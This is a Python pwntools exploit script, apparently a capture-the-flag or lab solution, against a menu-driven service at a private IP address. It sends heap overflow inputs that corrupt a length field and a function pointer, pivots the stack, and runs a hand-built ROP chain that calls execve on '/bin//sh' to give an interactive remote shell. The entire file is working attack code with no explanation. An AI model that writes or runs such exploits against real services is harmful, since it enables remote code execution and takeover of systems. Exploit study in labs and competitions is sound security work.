from pwn import *
from struct import pack

r = remote("172.16.37.128", 7741)


# Padding goes here
p = ''

p += pack('<I', 0x0807030a) # pop edx ; ret
p += pack('<I', 0x080ed000) # @ .data
p += pack('<I', 0x080bd226) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080a3a1d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807030a) # pop edx ; ret
p += pack('<I', 0x080ed004) # @ .data + 4
p += pack('<I', 0x080bd226) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080a3a1d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807030a) # pop edx ; ret
p += pack('<I', 0x080ed008) # @ .data + 8
p += pack('<I', 0x08055b40) # xor eax, eax ; ret
p += pack('<I', 0x080a3a1d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ed000) # @ .data
p += pack('<I', 0x080e76ad) # pop ecx ; ret
p += pack('<I', 0x080ed008) # @ .data + 8
p += pack('<I', 0x0807030a) # pop edx ; ret
p += pack('<I', 0x080ed008) # @ .data + 8
p += pack('<I', 0x08055b40) # xor eax, eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x08048ef6) # int 0x80

pivot_to_numbuf = 0x0804a097
intermediate_pivot1 = 0x080671c4
intermediate_pivot2 = 0x0804bb6c

# allocating the first chunk and overflow into msg_len
r.sendline("1")
r.sendline("131")
r.sendline("A" * 128 + "\xff\xff\xff")

# allocating the second chunk
r.sendline("1")
r.sendline("128")
r.sendline("B" * 128)

# overflowing first chunk's buffer into the second chunk
r.sendline("2")
r.sendline("0")
r.sendline("A" * 140 + p32(pivot_to_numbuf) + "B" * 0x2c + p)

# calling the function pointer in second chunk and pivoting
r.sendline("4")
r.sendline("1AAA" + "B" * 8 + p32(intermediate_pivot1) + p32(intermediate_pivot2))

r.interactive()
